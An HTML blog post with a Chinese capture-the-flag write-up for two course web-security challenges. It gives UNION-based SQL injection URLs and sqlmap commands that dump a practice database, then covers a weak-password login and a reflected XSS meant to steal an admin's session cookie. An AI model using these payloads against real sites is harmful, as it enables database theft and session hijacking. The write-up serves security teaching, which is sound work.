@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>[NSYSU 駭客攻防] HW 0x02 Writeups - Cyris&#39;s Blog</title><meta name="Description" content="This is Cyris&#39;s blog, recording life and sharing security learning."><meta property="og:title" content="[NSYSU 駭客攻防] HW 0x02 Writeups" />
+<meta property="og:description" content="Writeups 搬自 MacacaHub HTCF HW 0x02
+Author: @stavhaygn
+Writeup By: @yctseng1227" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.cyris.tw/posts/2020/nsysu-htcf-hw2/" /><meta property="og:image" content="https://blog.cyris.tw/img/cyris.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-12-09T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-12-09T00:00:00+00:00" /><meta property="og:site_name" content="Cyris&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://blog.cyris.tw/img/cyris.png"/>
+
+<meta name="twitter:title" content="[NSYSU 駭客攻防] HW 0x02 Writeups"/>
+<meta name="twitter:description" content="Writeups 搬自 MacacaHub HTCF HW 0x02
+Author: @stavhaygn
+Writeup By: @yctseng1227"/>
+<meta name="twitter:site" content="@yctseng1227"/>
+<meta name="application-name" content="Cyris&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Cyris&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/img/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://blog.cyris.tw/posts/2020/nsysu-htcf-hw2/" /><link rel="prev" href="https://blog.cyris.tw/posts/2020/nsysu-htcf-midterm-writeups/" /><link rel="next" href="https://blog.cyris.tw/posts/2021/swctf-0x7e4-writeups/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[NSYSU 駭客攻防] HW 0x02 Writeups",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/blog.cyris.tw\/posts\/2020\/nsysu-htcf-hw2\/"
+        },"image": ["https:\/\/blog.cyris.tw\/img\/cyris.png"],"genre": "posts","keywords": "NSYSU 駭客攻防, CTF-Writeup","wordcount":  454 ,
+        "url": "https:\/\/blog.cyris.tw\/posts\/2020\/nsysu-htcf-hw2\/","datePublished": "2020-12-09T00:00:00+00:00","dateModified": "2020-12-09T00:00:00+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "Cyris","logo": "https:\/\/blog.cyris.tw\/img\/cyris.png"},"author": {
+                "@type": "Person",
+                "name": "Cyris Tseng"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Cyris&#39;s Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/img/favicon.ico"
+        data-srcset="/img/favicon.ico, /img/favicon.ico 1.5x, /img/favicon.ico 2x"
+        data-sizes="auto"
+        alt="/img/favicon.ico"
+        title="/img/favicon.ico" />Cyris&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Cyris&#39;s Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/img/favicon.ico"
+        data-srcset="/img/favicon.ico, /img/favicon.ico 1.5x, /img/favicon.ico 2x"
+        data-sizes="auto"
+        alt="/img/favicon.ico"
+        title="/img/favicon.ico" />Cyris&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[NSYSU 駭客攻防] HW 0x02 Writeups</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://blog.cyris.tw" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Cyris Tseng</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-cyber-security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>資訊安全 Cyber Security</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-12-09">2020-12-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;454 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#news-160-points">news (160 points)</a>
+      <ul>
+        <li><a href="#description">Description</a></li>
+        <li><a href="#solution">Solution</a>
+          <ul>
+            <li>
+              <ul>
+                <li><a href="#find-database-name">Find Database name</a></li>
+                <li><a href="#find-table-name">Find Table name</a></li>
+                <li><a href="#find-column-type">Find column type</a></li>
+                <li><a href="#dump-target-flags">Dump target FLAGS</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#error-messages-220-points">error messages (220 points)</a>
+      <ul>
+        <li><a href="#description-1">Description</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Writeups 搬自 <a href="https://github.com/MacacaHub/CTF-writeups/blob/master/HTCF-CTF-2020/hw2/readme.md" target="_blank" rel="noopener noreffer ">MacacaHub HTCF HW 0x02</a></p>
+<p>Author: <strong>@stavhaygn</strong><br>
+Writeup By: <strong>@yctseng1227</strong></p>
+<br>
+<p>這兩題都出自今年 <a href="https://cisc2020.ccisa.org.tw" target="_blank" rel="noopener noreffer ">CISC2020 - Day 1</a>，由我們 <strong>MacacaHub</strong> 團隊負責的基礎網頁安全演練，當時 3 小時的時間沒辦法帶完課程實在有點可惜，身為 MacacaHub 助教的我當然不能洩氣，這次遇到相似ㄉ題目速速在最短時間解決 &gt;w&lt;!!</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/stavhaygn/cisc2020.ccisa.org.tw/blob/master/public/promotionals/practice.jpg?raw=true%22"
+        data-srcset="https://github.com/stavhaygn/cisc2020.ccisa.org.tw/blob/master/public/promotionals/practice.jpg?raw=true%22, https://github.com/stavhaygn/cisc2020.ccisa.org.tw/blob/master/public/promotionals/practice.jpg?raw=true%22 1.5x, https://github.com/stavhaygn/cisc2020.ccisa.org.tw/blob/master/public/promotionals/practice.jpg?raw=true%22 2x"
+        data-sizes="auto"
+        alt="https://github.com/stavhaygn/cisc2020.ccisa.org.tw/blob/master/public/promotionals/practice.jpg?raw=true&#34;"
+        title=" " /></p>
+<h2 id="news-160-points">news (160 points)</h2>
+<h3 id="description">Description</h3>
+<p>我都唸 SQL 。<br>
+不對，應該要唸 SQL ！<br>
+雖然我朋友都唸 SQL ，但我覺得應該要唸 SQL 。<br>
+可是我都唸 SQL。</p>
+<blockquote>
+<p><a href="https://news.macacahub.tw/" target="_blank" rel="noopener noreffer ">https://news.macacahub.tw/</a></p>
+</blockquote>
+<h3 id="solution">Solution</h3>
+<p>乍看之下是個普通的公告欄，隨意點進其中一則可以發現網址列帶 id 參數，題目已經提示是 SQL injection (SQLi) ，因此可以直接從網址的 id 參數下手作為注入點。其中，這種查詢資料庫類型的 SQLi ，我們可以搭配 <code>UNION SELECT</code> 針對可顯示資訊的頁面進行查詢。</p>
+<p>第一步，起手式用 <code>ORDER BY</code> 來推測查詢表格欄位的數目。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">https://news.macacahub.tw/new.php?id=1 ORDER BY 3       # success
+</span></span></span><span class="line"><span class="cl"><span class="err">https://news.macacahub.tw/new.php?id=1 ORDER BY 4       # fail
+</span></span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-1.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-1.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-1.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-1.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-1.png"
+        title=" " /></p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Tip<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>通常這類的 SQLi 後面常常會用 <code>#</code>、<code>--</code> 之類的把系統後面的語句註解掉，但這題後面沒有其他查詢所以就可以省略了 w</p>
+<p>同時，要注意通常網址送出去都會被轉換成 URL encode（ e.g. (空格) = &lsquo;%20&rsquo; ）</p>
+</div>
+        </div>
+    </div>
+<p>經過測試可以知道 id 的資料型態為整數，且測到 <code>ORDER BY 4</code> 網頁就沒有顯示畫面，表示查詢表格的欄位數為 3，如此一來我們就可以用 <code>UNION SELECT</code> 串接其他 SQL 的查詢語句（注意 <code>UNION SELECT</code> 後面接的查詢欄位數目必須和前句相同）。</p>
+<p>再來，我們嘗試戳 id，先找到一個無法正常查詢到的頁面（ e.g. id=6 ），拿來當作我們進行 SQLi 要顯示結果的畫面，配合剛剛摸索到的欄位數，先來塞個 1, 2, 3 看看會怎麼樣 XD</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">https://news.macacahub.tw/new.php?id=6 UNION SELECT 1,2,3
+</span></span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-2.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-2.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-2.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-2.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-2.png"
+        title=" " /></p>
+<p>OK 成功顯示！
+接下來就可以透過 SQL query 想辦法撈出我們想要的資訊，例如：SQL 版本。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">https://news.macacahub.tw/new.php?id=6 UNION SELECT @@version,NULL,NULL
+</span></span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-3.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-3.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-3.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-3.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-3.png"
+        title=" " /></p>
+<p>用了 MySQL 的版本查詢方式 <code>@@version</code> 發現可以成功撈到版本。
+下一步，我們需要先知道現在所在的資料庫名稱。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">https://news.macacahub.tw/new.php?id=6 UNION SELECT DATABASE(),NULL,NULL
+</span></span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-4.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-4.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-4.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-4.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-4.png"
+        title=" " /></p>
+<p><code>DATABASE()</code> 是 SQL 定義的 function，因此可以輕鬆拿到我們的目標資料庫！<del>當駭客就是這麼簡單</del>
+目前可以知道資料庫名稱為 <strong>newsdb</strong> ，下一步要找的是表格名稱。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">https://news.macacahub.tw/new.php?id=6 UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()
+</span></span></span></code></pre></div><div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Tip<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">注意，如果沒有用 <code>GROUP_CONCAT</code> 把 table_name 包起來，在 SQL query 找到第一筆符合條件的資料就會return，不會將所有符合條件的結果都列出來。</div>
+        </div>
+    </div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-5.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-5.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-5.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-5.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-5.png"
+        title=" " /></p>
+<p>這裡開始就會牽涉到 SQL 的結構，這裡用到 <code>information_schema</code> 是 MySQL 這種關聯式資料庫的一種特殊結構描述，用途是儲存資料庫的中繼資料，有興趣的可以參考 <strong>飛飛</strong> 的 <a href="https://ithelp.ithome.com.tw/articles/10220294" target="_blank" rel="noopener noreffer ">Web Security 魔法使攻略─SQL injection 起手式</a>。
+總之，搭配 SQL query 可以撈到資料庫內的兩份表格 <strong>FLAGS</strong>, <strong>News</strong>，我們很直覺的猜測 Flag 放在 <strong>FLAGS</strong>、公告欄訊息放在 <strong>News</strong>！<del>當然助教也有可能故意放反搞人</del></p>
+<p>下一步，來看看表格內的欄位資訊。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">https://news.macacahub.tw/new.php?id=6 UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_schema=database() and table_name=&#39;FLAGS&#39; 
+</span></span></span></code></pre></div><div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Tip<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">這邊的 column_name 同理記得用 <code>GROUP_CONCAT()</code> 才能把所有資訊撈出來，如果嫌太輕鬆可以用 <code>LIMIT</code> 慢慢戳（笑）</div>
+        </div>
+    </div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-6.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-6.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-6.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-6.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-6.png"
+        title=" " /></p>
+<p>可以發現只有兩欄，分別是 id 和 flag，剩下就是針對欄位名稱要把我們想知道的 Flag 拿出來！</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">https://news.macacahub.tw/new.php?id=6 UNION SELECT id,flag,NULL FROM FLAGS
+</span></span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-7.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-7.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-7.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-7.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/0-7.png"
+        title=" " /></p>
+<p>其他有關 SQLi 的 Payload 可以參考這個
+<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener noreffer ">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
+<p><br><br></p>
+<p>當然可以用純手工的方式慢慢戳，<del>但身為肥宅要顧二次元老婆才沒有辣麼多時間</del>，利用 <code>sqlmap</code> 工具更快進行上述這般的 SQLi 拿 Flag，流程上大致相同。</p>
+<h5 id="find-database-name">Find Database name</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -u https://news.macacahub.tw/new.php<span class="se">\?</span>id<span class="se">\=</span><span class="m">1</span> --dbs
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-1.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-1.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-1.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-1.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-1.png"
+        title=" " /></p>
+<h5 id="find-table-name">Find Table name</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -u https://news.macacahub.tw/new.php<span class="se">\?</span>id<span class="se">\=</span><span class="m">1</span> -D newsdb --tables
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-2.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-2.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-2.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-2.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-2.png"
+        title=" " /></p>
+<h5 id="find-column-type">Find column type</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -u https://news.macacahub.tw/new.php<span class="se">\?</span>id<span class="se">\=</span><span class="m">1</span> -D newsdb -T FLAGS --columns
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-3.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-3.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-3.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-3.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-3.png"
+        title=" " /></p>
+<h5 id="dump-target-flags">Dump target FLAGS</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -u https://news.macacahub.tw/new.php<span class="se">\?</span>id<span class="se">\=</span><span class="m">1</span> -D newsdb -T FLAGS --dump
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-4.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-4.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-4.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-4.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-4.png"
+        title=" " /></p>
+<p>或是，可以用更暴力的方式，不管三七二十一直接 <strong>DUMP</strong> 就對了！</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -u https://news.macacahub.tw/new.php<span class="se">\?</span>id<span class="se">\=</span><span class="m">1</span> --dump
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-5.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-5.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-5.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-5.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/1-5.png"
+        title=" " /></p>
+<p><font size=1><del>有夠兇</del></font></p>
+<br>
+<h2 id="error-messages-220-points">error messages (220 points)</h2>
+<h3 id="description-1">Description</h3>
+<p>說笑話給 admin 拿 session</p>
+<blockquote>
+<p><a href="https://message.macacahub.tw/" target="_blank" rel="noopener noreffer ">https://message.macacahub.tw/</a></p>
+</blockquote>
+<p><strong>hint: 政府網站最喜歡用的帳號之一 <code>user</code></strong></p>
+<p>由於解題人數不甚樂觀，助教額外加了其他 Hint:
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Tip<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>bonus 1</strong>: 在登入頁面找 XSS 注入點<br>
+<strong>bonus 2</strong>: XAMPP快速架站 + 記得要用public IP (或是ngrok穿隧)<br>
+<strong>bonus 3</strong>: admin 會模擬真人點擊你傳送的連結(笑話)</div>
+        </div>
+    </div></p>
+<h3 id="solution-1">Solution</h3>
+<p>本題主要分兩個部分：</p>
+<p>a.	弱密碼</p>
+<p>弱密碼，顧名思義為了求簡單記憶像是 admin:password，從題目提示「台灣政府網站最喜歡用的帳號之一 user」，加上許多網站開發人員為求方便常常把帳號密碼設定相同，因此這題可以<del>不小心</del>用 <strong>user : user</strong> 成功登入。</p>
+<p>b.	XSS</p>
+<p>從登入失敗的錯誤提示可以發現 &quot; Incorrect username or password&quot; 會同時顯示在網址以 msg 參數列出，對此我們可以嘗試在該處進行測試，發現有 XSS 漏洞。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-1.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-1.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-1.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-1.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-1.png"
+        title=" " /></p>
+<br>
+<p>使用弱密碼登入後，發現由於非 admin 帳號因此無法拿 Flag。<br>
+此外網站給了輸入框表示可以說笑話給 admin，嘗試輸入「C8763」被說不好笑QQ</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-2.png"
+        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-2.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-2.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-2.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw2/pic/2-2.png"
+        title=" " /></p>
+<p>根據提示「admin會模擬真人點擊你傳送的連結」，不難猜到需要透過前述的 XSS 漏洞讓 admin 點擊取得 admin 的 session，再修改網頁的 cookie 拿 Flag，對此我們需要架 server 來接收 admin 的 session。</p>
